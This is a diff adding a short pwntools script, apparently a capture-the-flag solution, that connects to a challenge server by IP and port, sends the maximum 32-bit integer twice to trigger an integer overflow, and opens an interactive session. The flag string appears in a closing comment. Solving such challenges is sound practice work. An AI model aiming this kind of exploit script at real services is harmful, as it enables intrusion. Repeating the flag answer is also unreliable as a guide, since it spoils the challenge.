@@ -1,0 +1,15 @@
+from pwn import *
+
+script = '''
+b *main
+breakrva 0x13E0
+'''
+
+p = remote("103.69.97.144", 6051)
+
+max_int = 0x7fffffff
+p.sendline(f"{max_int}".encode())
+p.sendline(f"{max_int}".encode())
+
+p.interactive()
+#BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}
